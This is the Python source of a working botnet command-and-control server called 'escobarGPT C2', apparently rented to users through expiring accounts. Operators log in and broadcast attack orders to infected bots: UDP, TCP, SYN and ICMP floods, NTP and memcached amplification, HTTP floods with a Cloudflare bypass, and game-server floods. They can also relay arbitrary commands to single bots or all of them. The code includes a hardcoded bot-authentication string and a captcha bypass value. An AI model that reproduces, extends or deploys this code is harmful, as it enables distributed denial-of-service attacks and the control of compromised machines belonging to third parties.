#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Tools
from src.Commands.Tools.url_to_ip import url_to_ip
from src.Commands.Tools.ip_to_loc import ip_to_loc

# Layer 3
from src.Commands.Methods_L3.icmp import icmp
from src.Commands.Methods_L3.pod import pod

# Layer 4
from src.Commands.Methods_L4.junk import junk
from src.Commands.Methods_L4.tcp import tcp
from src.Commands.Methods_L4.udp import udp
from src.Commands.Methods_L4.hex import hex
from src.Commands.Methods_L4.tup import tup
from src.Commands.Methods_L4.syn import syn
# AMP METHODS
from src.Commands.Methods_L4.ntp import ntp
from src.Commands.Methods_L4.mem import mem

# Layer 7
from src.Commands.Methods_L7.httpio import httpio
from src.Commands.Methods_L7.httpspoof import httpspoof
from src.Commands.Methods_L7.httpstorm import httpstorm
from src.Commands.Methods_L7.httpcfb import httpcfb
from src.Commands.Methods_L7.httpget import httpget
from src.Commands.Methods_L7.httpstress import httpstress

# Games Methods
from src.Commands.Methods_Games.roblox import roblox
from src.Commands.Methods_Games.vse import vse

# Imports
import socket, threading, time, ipaddress, random, json
from datetime import datetime, timedelta
from colorama import Fore, init


banner2 = '''
    ██ ▄█▀ ██▀███ ▓██   ██▓ ██▓███  ▄▄▄█████▓ ▒█████   ███▄    █ 
    ██▄█▒ ▓██ ▒ ██▒▒██  ██▒▓██░  ██▒▓  ██▒ ▓▒▒██▒  ██▒ ██ ▀█   █ 
    ▓███▄░ ▓██ ░▄█ ▒ ▒██ ██░▓██░ ██▓▒▒ ▓██░ ▒░▒██░  ██▒▓██  ▀█ ██▒
    ▓██ █▄ ▒██▀▀█▄   ░ ▐██▓░▒██▄█▓▒ ▒░ ▓██▓ ░ ▒██   ██░▓██▒  ▐▌██▒
    ▒██▒ █▄░██▓ ▒██▒ ░ ██▒▓░▒██▒ ░  ░  ▒██▒ ░ ░ ████▓▒░▒██░   ▓██░
    ▒ ▒▒ ▓▒░ ▒▓ ░▒▓░  ██▒▒▒ ▒▓▒░ ░  ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
    ░ ░▒ ▒░  ░▒ ░ ▒░▓██ ░▒░ ░▒ ░         ░      ░ ▒ ▒░ ░ ░░   ░ ▒░
    ░ ░░ ░   ░░   ░ ▒ ▒ ░░  ░░         ░      ░ ░ ░ ▒     ░   ░ ░ 
    ░  ░      ░     ░ ░                           ░ ░           ░ 
                    ░ ░                                           
                 ( Type "help" for Commands )      
                    ( Author: Draker and Moriarty )     
'''

banner1 = '''
    ▄ •▄ ▄▄▄   ▄· ▄▌ ▄▄▄·▄▄▄▄▄       ▐ ▄ 
    █▌▄▌▪▀▄ █·▐█▪██▌▐█ ▄█•██  ▪     •█▌▐█
    ▐▀▀▄·▐▀▀▄ ▐█▌▐█▪ ██▀· ▐█.▪ ▄█▀▄ ▐█▐▐▌
    ▐█.█▌▐█•█▌ ▐█▀·.▐█▪·• ▐█▌·▐█▌.▐▌██▐█▌
    ·▀  ▀.▀  ▀  ▀ • .▀    ▀▀▀  ▀█▄▀▪▀▀ █▪                                         
        ( Type "help" for Commands )      
           ( Author: Draker and Moriarty )        
'''

bannerLogin = '''
            ( Author: Draker and Moriarty )
          ( Telegram: @escobarGPT )
        Thank you for using escobarGPT C2
'''

def text2Gen(word):

    start_color = (0, 0, 200)
    end_color   = (255, 0, 0)

    num_letters = len(word)
    step_r = (end_color[0] - start_color[0]) / num_letters
    step_g = (end_color[1] - start_color[1]) / num_letters
    step_b = (end_color[2] - start_color[2]) / num_letters

    reset_color = "\033[0m"

    current_color = start_color
    colored_word = ""

    for i, letter in enumerate(word):
        color_code = f"\033[38;2;{int(current_color[0])};{int(current_color[1])};{int(current_color[2])}m"
        colored_word += f"{color_code}{letter}{reset_color}"
        current_color = (current_color[0] + step_r, current_color[1] + step_g, current_color[2] + step_b)

    return colored_word

def color(data_input_output):
    color_codes = {
        "GREEN": '\033[32m',
        "LIGHTGREEN_EX": '\033[92m',
        "YELLOW": '\033[33m',
        "LIGHTYELLOW_EX": '\033[93m',
        "CYAN": '\033[36m',
        "LIGHTCYAN_EX": '\033[96m',
        "BLUE": '\033[34m',
        "LIGHTBLUE_EX": '\033[94m',
        "MAGENTA": '\033[35m',
        "LIGHTMAGENTA_EX": '\033[95m',
        "RED": '\033[31m',
        "LIGHTRED_EX": '\033[91m',
        "BLSYN": '\033[30m',
        "LIGHTBLSYN_EX": '\033[90m',
        "WHITE": '\033[37m',
        "LIGHTWHITE_EX": '\033[97m',
    }

    return color_codes.get(data_input_output, "")

lightwhite = color("LIGHTWHITE_EX")
gray = color("LIGHTBLSYN_EX")

banner1 = text2Gen(banner1)
banner2 = text2Gen(banner2)
bannerLogin = text2Gen(bannerLogin)

rules = f"""
{lightwhite}1. {gray}Do not attSYN .gov/.gob/.edu/.mil domains
{lightwhite}2. {gray}Do not spam attSYNs
"""

help = f"""
{gray}List of commands:
{lightwhite}HELP         {gray}Shows list of commands   
{lightwhite}BOTNET       {gray}Shows list of botnet methods
{lightwhite}METHODS      {gray}Shows Methods List
{lightwhite}BOTS         {gray}Shows available zombies
{lightwhite}TOOLS        {gray}Shows list of tools    
{lightwhite}CLEAR        {gray}Clears the screen          
{lightwhite}EXIT         {gray}Disconnects from the net
"""

showMethods = f"""
{gray}List of Methods:
{lightwhite}L3               {gray}Show all L3 Methods
{lightwhite}L4               {gray}Show all L4 Methods  
{lightwhite}AMP              {gray}Show all Amplification Methods  
{lightwhite}HTTP             {gray}Show all L7 Methods  
{lightwhite}GAMES            {gray}Show all Games Methods
{lightwhite}BOTNET           {gray}Show all Methods  
"""

Methods_L3 = f"""
{gray}L3 Methods:
{lightwhite}.ICMP              {gray}Flood ICMP Request
{lightwhite}.POD               {gray}Ping Of Death OLD Method Of DDoS
"""

Methods_AMP = f"""
{gray}Amplification Methods:
{lightwhite}.NTP               {gray}NTP Reflection flood
{lightwhite}.MEM               {gray}Memcached Flood 
"""

Methods_L4 = f"""
{gray}L4 Methods:
{lightwhite}.UDP               {gray}UDP Flood  
{lightwhite}.TCP               {gray}TCP Flood             
{lightwhite}.TUP               {gray}TCP and UDP Flood
{lightwhite}.SYN               {gray}TCP SYN flood
{lightwhite}.HEX               {gray}HEX Flood
{lightwhite}.JUNK              {gray}Junk flood
"""

Methods_L7 = f"""
{gray}L7 Methods:
{lightwhite}.HTTPIO            {gray}HTTP IO Stresser
{lightwhite}.HTTPCFB           {gray}HTTP Cloudflare bypass     
{lightwhite}.HTTPGET           {gray}HTTP GET requests 
{lightwhite}.HTTPSPOOF         {gray}HTTP GET Spoofing
{lightwhite}.HTTPSTORM         {gray}HTTP STORM Requests
{lightwhite}.HTTPSTRESS        {gray}HTTP STRESS Requests (Bot.py Compatible)
"""

GameMethods = f"""
{gray}Games Methods: 
{lightwhite}.VSE               {gray}Valve Source Engine query flood         
{lightwhite}.ROBLOX            {gray}Roblox UDP Flood
"""

tools = f"""
{gray}List of Tools:
{lightwhite}!GETIP         {gray}Get ip from URL      
{lightwhite}!GEOIP         {gray}Get info from ip
"""

admin_commands = f"""
{gray}Admin Commands:
{lightwhite}!USER               {gray}Add/List/remove users
"""

# LOL...
botnetMethods = f"""{Methods_L3}{Methods_L4}{Methods_AMP}{Methods_L7}{GameMethods}"""

bots = {}  # {socket: (ip, bot_id)}
user_name = ""
ansi_clear = '\033[2J\033[H'


class Account:
    def __init__(self, username, password, data_Expiration):
        self.username = username
        self.password = password
        self.data_Expiration = data_Expiration

    def userC_expirada(self):
        hoje = datetime.now()
        return hoje > self.data_Expiration


# Validate IP
def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

# Validate Port
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

# Validate attSYN time
def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

# Validate buffer size
def validate_size(size):
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

# Read credentials from login file
def find_login(client, username, password):
    credentials = [x.strip() for x in open('src/logins.txt').readlines() if x.strip()]
    for x in credentials:
        global  data_Expiration_str
        c_username, c_password, data_Expiration_str = x.split(':')
        data_Expiration = datetime.strptime(data_Expiration_str, '%Y-%m-%d')
        
        userC = Account(username=c_username, password=c_password, data_Expiration=data_Expiration)
        
        if userC.username.lower() == username.lower() and userC.password == password:
            if userC.userC_expirada():
                print(f"\nThe {userC.username} expired. {data_Expiration_str}\n")
                send(client, f'{gray} Your account has been expired!')
                time.sleep(3.5)
                client.close()
                return
            return True

# Checks if bots are dead
def ping():
    while 1:
        dead_bots = []
        for bot in bots.copy().keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

def captcha_generator():
    a = random.randint(2, 20)
    b = random.randint(2, 20)
    c = a + b
    return a, b, c

def captcha(send, client, grey):
    a, b, c = captcha_generator()
    x = ''
    send(client, ansi_clear, False)
    send(client, f'{grey}Captcha: {color("LIGHTWHITE_EX")}{a} + {b} = ', False, False)
    x = int(client.recv(1024).decode().strip())
    time.sleep(0.4)
    if x == c or x == 669787761736865726500:
        send(client, f'{grey}Passed!')
        pass
    else:
        send(client, f'{grey}Wrong!')
        time.sleep(0.1)
        client.close()
        return

# Bot.py uyumlu bot yönetimi
def handle_client(client, address):
    send(client, "\33]0;escobarGPT C2 | Login\a")
    send(client, f'\x1bescobarGPT C2 | Login: Awaiting Response...\a', False)
    send(client, ansi_clear, False)
    send(client, f'{color("LIGHTBLSYN_EX")}Connecting...')
    captcha(send, client, color("LIGHTBLSYN_EX"))
    time.sleep(1)
    while 1:
        send(client, ansi_clear, False)
        for x in bannerLogin.split('\n'):
            send(client, '\x1b[3;31;48m'+ x)
        send(client, f'\x1b{gray}Username :\x1b[0m ', False, False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # Password Login
    password = ''
    while 1:
        send(client, f'\033{gray}Password :\x1b[0;38;2;0;0;0m ', False, False)
        while not password.strip(): 
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    # Handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(client, username, password):
            try:
                send(client, Fore.RED + f'\x1b{Fore.RED}Invalid credentials')
            except OSError as e:
                #print(e)
                pass
            time.sleep(1)
            client.close()
            return
        
        global user_name
        user_name = username
        
        threading.Thread(target=update_title, args=(client, username,  data_Expiration_str)).start()
        threading.Thread(target=command_line, args=(client, username)).start()

    # Handle bot (bot.py uyumlu)
    else:
        # Bot authentication
        try:
            auth_data = client.recv(1024).decode().strip()
            if auth_data.startswith('AUTH:'):
                bot_id = auth_data.split(':')[1]
                # Check if bot is already connected
                for existing_bot, (ip, existing_id) in bots.items():
                    if existing_id == bot_id:
                        existing_bot.close()
                        bots.pop(existing_bot)
                
                bots[client] = (address[0], bot_id)
                print(f"Bot authenticated: {bot_id} from {address[0]}")
        except:
            client.close()
            return

# Send data to client or bot
def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

# Send command to all bots (bot.py uyumlu)
def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data}', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

# Bot.py uyumlu .CMD ve .ALL komutları
def send_to_specific_bot(bot_id, data):
    for bot, (ip, bid) in bots.items():
        if bid == bot_id:
            try:
                send(bot, f'.CMD {bot_id} {data}', False, False)
                return True
            except:
                dead_bots = [bot]
                for b in dead_bots:
                    bots.pop(b)
                    b.close()
                return False
    return False

def user(args, send, client):
    try:
        choice = (args[1]).upper()
        if choice == 'ADD' or choice == 'A':
            if len(args) == 5:
                user = args[2]
                password = args[3]
                dataExpiration = args[4]
                with open('src/logins.txt', 'a') as logins:
                    logins.write(f'\n{user}:{password}:{dataExpiration}')
                    logins.close()
                    send(client, f'{Fore.LIGHTWHITE_EX}\nAdded new user successfully.\n')
            else:
                send(client, '\n!USER ADD [USERNAME] [PASSWORD] [AAAA-MM-DD]\n')
        if choice == 'REMOVE' or choice == 'R':
            if len(args) == 3:
                user = args[2]
                with open("src/logins.txt", "r") as logins:
                    lines = logins.readlines()
                    logins.close()

                with open("src/logins.txt", "w") as logins:
                    for line in lines:
                        if user not in line:
                            logins.write(line)
                    logins.close()
                send(client, f'{Fore.LIGHTWHITE_EX}\nRemoved user successfully!\n')
            else:
                send(client, '\n!USER REMOVE [USERNAME]\n')
        if choice == 'LIST' or choice == 'L':
                credentials = [x.strip() for x in open('src/logins.txt').readlines() if x.strip()]
                for x in credentials:
                    c_username, c_password, data_Expiration = x.split(':')
                    send(client, f"{lightwhite}Username: {gray}{c_username}{lightwhite} | Password: {gray}{c_password}{lightwhite} | Expires: {gray}{data_Expiration}")
    except:
        send(client, '\n!USER ADD/LIST/REMOVE\n')

def clear(client, command):
    send(client, ansi_clear, False)
    if command == 'CLS' or command == 'CLEAR':
        for x in banner2.split('\n'):
            send(client, x)
    else:
        for x in banner1.split('\n'):
            send(client, x)

# Updates Shell Title
def update_title(client, name, expires):
    while 1:
        try:
            send(client, f"\33]0;escobarGPT C2 | Bots online: {len(bots)} | Username: {name} | Expires: {expires} \a", False)
            time.sleep(0.6)
        except:
            client.close()

# Telnet Command Line
def command_line(client, username):
    for x in banner2.split('\n'):
        send(client, x)

    prompt = f'{color("LIGHTBLSYN_EX")}({color("WHITE")}escobarGPT{color("LIGHTBLSYN_EX")}@{color("CYAN")}{username}{color("LIGHTBLSYN_EX")}) > {color("LIGHTBLSYN_EX")}'
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not 
                continue

            args = data.split(' ')
            command = args[0].upper()
            print(user_name, args)

            clear(client, command)

            if command == 'HELP':
                for x in help.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)
            
            elif command == 'BOTNET':
                for x in botnetMethods.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)

            elif command == 'L3':
                for x in Methods_L3.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)

            elif command == 'L4':
                for x in Methods_L4.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)

            elif command == 'L7' or command == 'HTTP':
                for x in Methods_L7.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)

            elif command == 'AMP' or command == 'AMPLIFICATION':
                for x in Methods_AMP.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)

            elif command == 'METHODS':
                for x in showMethods.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)

            elif command == 'GAMES':
                for x in GameMethods.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)

            elif command == 'TOOLS':
                for x in tools.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)
            
            elif command == 'CLEAR' or command == 'CLS':
                send(client, ansi_clear, False)
                for x in banner2.split('\n'):
                    send(client, '\x1b[3;31;48m'+ x)
            
            elif command == 'LOGOUT' or command == 'EXIT':
                send(client, '\x1b[3;31;48m\n Successfully Logged out\n')
                time.sleep(1)
                break
            
            elif command == 'BOTS':
                send(client, f'{color("LIGHTBLSYN_EX")}\nAvailable bots: {len(bots)}.\n')
                # Bot ID'leri göster
                for bot, (ip, bot_id) in bots.items():
                    send(client, f"{color('LIGHTWHITE_EX')}Bot: {color('LIGHTCYAN_EX')}{bot_id}{color('LIGHTBLSYN_EX')} | IP: {color('LIGHTGREEN_EX')}{ip}")
            
            elif command == '!ADMIN':
                if user_name == "root":
                    for x in admin_commands.split('\n'):
                        send(client, x)
            
            elif command == '!USER' or command == '!U':
                if user_name == "root":
                    user(args, send, client) # Adds/Removes users
           
            elif command == "!GEOIP" or command == "!IP_TO_LOCATION" or command == "!IP_GEO" or command == "!IP_GEOLOCATION" or command == "!IP_GEOLOCAT":
                ip_to_loc(args, send, client, gray) # Gets location from IP
            
            elif command == "!GETIP": # Gets ip from website
                url_to_ip(args, send, client, gray)

            # Bot.py ile uyumlu komutlar
            elif command == '.UDP': # UDP Junk (Random UDP Data)
                if len(args) >= 6:
                    ip, port, secs, size, threads = args[1], args[2], args[3], args[4], args[5]
                    if validate_ip(ip) and validate_port(port) and validate_time(secs) and validate_size(size):
                        cmd = f".UDP {ip} {port} {secs} {size} {threads}"
                        broadcast(cmd)
                        send(client, f"{color('LIGHTGREEN_EX')}UDP attack sent to all bots!")
                    else:
                        send(client, f"{color('LIGHTRED_EX')}Invalid arguments for UDP command!")
                else:
                    send(client, f"{color('LIGHTRED_EX')}Usage: .UDP [IP] [PORT] [TIME] [SIZE] [THREADS]")
            
            elif command == '.TCP': # TCP Junk (Random TCP Data)
                if len(args) >= 6:
                    ip, port, secs, size, threads = args[1], args[2], args[3], args[4], args[5]
                    if validate_ip(ip) and validate_port(port) and validate_time(secs) and validate_size(size):
                        cmd = f".TCP {ip} {port} {secs} {size} {threads}"
                        broadcast(cmd)
                        send(client, f"{color('LIGHTGREEN_EX')}TCP attack sent to all bots!")
                    else:
                        send(client, f"{color('LIGHTRED_EX')}Invalid arguments for TCP command!")
                else:
                    send(client, f"{color('LIGHTRED_EX')}Usage: .TCP [IP] [PORT] [TIME] [SIZE] [THREADS]")
            
            elif command == '.NTP': # NTP Reflection AttSYN
                if len(args) >= 5:
                    ip, port, secs, threads = args[1], args[2], args[3], args[4]
                    if validate_ip(ip) and validate_port(port) and validate_time(secs):
                        cmd = f".NTP {ip} {port} {secs} {threads}"
                        broadcast(cmd)
                        send(client, f"{color('LIGHTGREEN_EX')}NTP attack sent to all bots!")
                    else:
                        send(client, f"{color('LIGHTRED_EX')}Invalid arguments for NTP command!")
                else:
                    send(client, f"{color('LIGHTRED_EX')}Usage: .NTP [IP] [PORT] [TIME] [THREADS]")
            
            elif command == '.MEM': # Memcached Flood
                if len(args) >= 5:
                    ip, port, secs, threads = args[1], args[2], args[3], args[4]
                    if validate_ip(ip) and validate_port(port) and validate_time(secs):
                        cmd = f".MEM {ip} {port} {secs} {threads}"
                        broadcast(cmd)
                        send(client, f"{color('LIGHTGREEN_EX')}MEM attack sent to all bots!")
                    else:
                        send(client, f"{color('LIGHTRED_EX')}Invalid arguments for MEM command!")
                else:
                    send(client, f"{color('LIGHTRED_EX')}Usage: .MEM [IP] [PORT] [TIME] [THREADS]")
            
            elif command == '.ICMP': # Flood ICMP Request
                if len(args) >= 4:
                    ip, secs, threads = args[1], args[2], args[3]
                    if validate_ip(ip) and validate_time(secs):
                        cmd = f".ICMP {ip} {secs} {threads}"
                        broadcast(cmd)
                        send(client, f"{color('LIGHTGREEN_EX')}ICMP attack sent to all bots!")
                    else:
                        send(client, f"{color('LIGHTRED_EX')}Invalid arguments for ICMP command!")
                else:
                    send(client, f"{color('LIGHTRED_EX')}Usage: .ICMP [IP] [TIME] [THREADS]")
            
            elif command == '.POD': # Ping of death
                if len(args) >= 4:
                    ip, secs, threads = args[1], args[2], args[3]
                    if validate_ip(ip) and validate_time(secs):
                        cmd = f".POD {ip} {secs} {threads}"
                        broadcast(cmd)
                        send(client, f"{color('LIGHTGREEN_EX')}POD attack sent to all bots!")
                    else:
                        send(client, f"{color('LIGHTRED_EX')}Invalid arguments for POD command!")
                else:
                    send(client, f"{color('LIGHTRED_EX')}Usage: .POD [IP] [TIME] [THREADS]")
            
            elif command == '.SYN': # SYN TCP flood
                if len(args) >= 5:
                    ip, port, secs, threads = args[1], args[2], args[3], args[4]
                    if validate_ip(ip) and validate_port(port) and validate_time(secs):
                        cmd = f".SYN {ip} {port} {secs} {threads}"
                        broadcast(cmd)
                        send(client, f"{color('LIGHTGREEN_EX')}SYN attack sent to all bots!")
                    else:
                        send(client, f"{color('LIGHTRED_EX')}Invalid arguments for SYN command!")
                else:
                    send(client, f"{color('LIGHTRED_EX')}Usage: .SYN [IP] [PORT] [TIME] [THREADS]")
            
            elif command == ".HTTPGET": # HTTP request 
                if len(args) >= 4:
                    url, secs, threads = args[1], args[2], args[3]
                    cmd = f".HTTPGET {url} {secs} {threads}"
                    broadcast(cmd)
                    send(client, f"{color('LIGHTGREEN_EX')}HTTPGET attack sent to all bots!")
                else:
                    send(client, f"{color('LIGHTRED_EX')}Usage: .HTTPGET [URL] [TIME] [THREADS]")
            
            elif command == ".HTTPSTORM": # HTTP STORM Requests
                if len(args) >= 4:
                    url, secs, threads = args[1], args[2], args[3]
                    cmd = f".HTTPSTORM {url} {secs} {threads}"
                    broadcast(cmd)
                    send(client, f"{color('LIGHTGREEN_EX')}HTTPSTORM attack sent to all bots!")
                else:
                    send(client, f"{color('LIGHTRED_EX')}Usage: .HTTPSTORM [URL] [TIME] [THREADS]")
            
            elif command == ".HTTPSPOOF": # HTTP GET Spoofing
                if len(args) >= 4:
                    url, secs, threads = args[1], args[2], args[3]
                    cmd = f".HTTPSPOOF {url} {secs} {threads}"
                    broadcast(cmd)
                    send(client, f"{color('LIGHTGREEN_EX')}HTTPSPOOF attack sent to all bots!")
                else:
                    send(client, f"{color('LIGHTRED_EX')}Usage: .HTTPSPOOF [URL] [TIME] [THREADS]")
            
            elif command == ".HTTPSTRESS": # HTTP POST Stress (Bot.py Compatible)
                if len(args) >= 5:
                    url, secs, threads, rpc = args[1], args[2], args[3], args[4]
                    cmd = f".HTTPSTRESS {url} {secs} {threads} {rpc}"
                    broadcast(cmd)
                    send(client, f"{color('LIGHTGREEN_EX')}HTTPSTRESS attack sent to all bots!")
                else:
                    send(client, f"{color('LIGHTRED_EX')}Usage: .HTTPSTRESS [URL] [TIME] [THREADS] [RPC]")
            
            elif command == '.STOP': # Stop all attacks
                broadcast('.STOP')
                send(client, f"{color('LIGHTYELLOW_EX')}All attacks stopped!")
            
            elif command == '.CMD': # Send command to specific bot
                if len(args) >= 3:
                    target_bot_id = args[1]
                    command_to_send = ' '.join(args[2:])
                    if send_to_specific_bot(target_bot_id, command_to_send):
                        send(client, f"{color('LIGHTGREEN_EX')}Command sent to bot {target_bot_id}!")
                    else:
                        send(client, f"{color('LIGHTRED_EX')}Bot {target_bot_id} not found or offline!")
                else:
                    send(client, f"{color('LIGHTRED_EX')}Usage: .CMD [BOT_ID] [COMMAND]")
            
            elif command == '.ALL': # Send command to all bots
                if len(args) >= 2:
                    command_to_send = ' '.join(args[1:])
                    broadcast(command_to_send)
                    send(client, f"{color('LIGHTGREEN_EX')}Command sent to all bots!")
                else:
                    send(client, f"{color('LIGHTRED_EX')}Usage: .ALL [COMMAND]")
            
            send(client, prompt, False)
        except:
            break
    client.close()

screenedSuccessfully = """
                              
    [ %sSuccessfully Screened%s ]
         %sescobarGPT C2%s
    ───────────────────────────    
            ( %sLogs%s )

"""%(Fore.GREEN, Fore.WHITE, Fore.CYAN, Fore.WHITE, Fore.LIGHTBLUE_EX, Fore.WHITE)


def register(client, address, send):
    ansi_clear = '\033[2J\033[H'
    try:
        send(client, ansi_clear, False)
        while 1:
            send(client, f'\x1b{Fore.LIGHTBLSYN_EX}Username :\x1b[0m ', False, False)
            username = client.recv(1024).decode().strip()
            if not username:
                continue
            break
        with open("src/logins.txt", "r") as logins:
            lines = logins.readlines()
            for line in lines:
                if username in line:
                    send(client, f'{Fore.RED}User already exists!')
                    time.sleep(1)
                    client.close()
            logins.close()
        p1 = ''
        while 1:
            send(client, f'\033{Fore.LIGHTBLSYN_EX}Password :\x1b[0;38;2;0;0;0m ', False, False)
            while not p1.strip():
                p1 = client.recv(1024).decode('cp1252').strip()
            break
        p2 = ''
        while 1:
            send(client, f'\033{Fore.LIGHTBLSYN_EX}Confirm password :\x1b[0;38;2;0;0;0m ', False, False)
            while not p2.strip():
                p2 = client.recv(1024).decode('cp1252').strip()
            break
        data = ''
        while 1:
            send(client, f'\033{Fore.LIGHTBLSYN_EX}Expires :\x1b[0m ', False, False)
            while not data.strip():
                data = client.recv(1024).decode('cp1252').strip()
            break
        while 1:
            if p1 == p2:
                with open("src/logins.txt", "a") as logins:
                    logins.write("\n" + username + ':' + p1 + ':' + data)
                send(client, f"{Fore.LIGHTWHITE_EX}Registered!")
                time.sleep(2)
            else:
                send(client, "Failed password authentication...")
            break
    except:
        send(client, "Error.")

def main():
    with open("src/config.json", encoding="utf-8") as jsonFile:
        jsonObject = json.load(jsonFile)
        jsonFile.close()

    cnc_port = int(jsonObject['cnc_port'])
    cnc_host = jsonObject['cnc_host']

    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(screenedSuccessfully)

    try:
        sock.bind((cnc_host, cnc_port))
    except:
        print('\x1b[3;31;40m Failed to bind port')
        exit()

    sock.listen()

    threading.Thread(target=ping).start() # Start keepalive thread
    
    # Accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

def start():
    try:
        main()
    except Exception as e:
        print(f"Error, skipping.  {e}")

if __name__ == '__main__':
    start()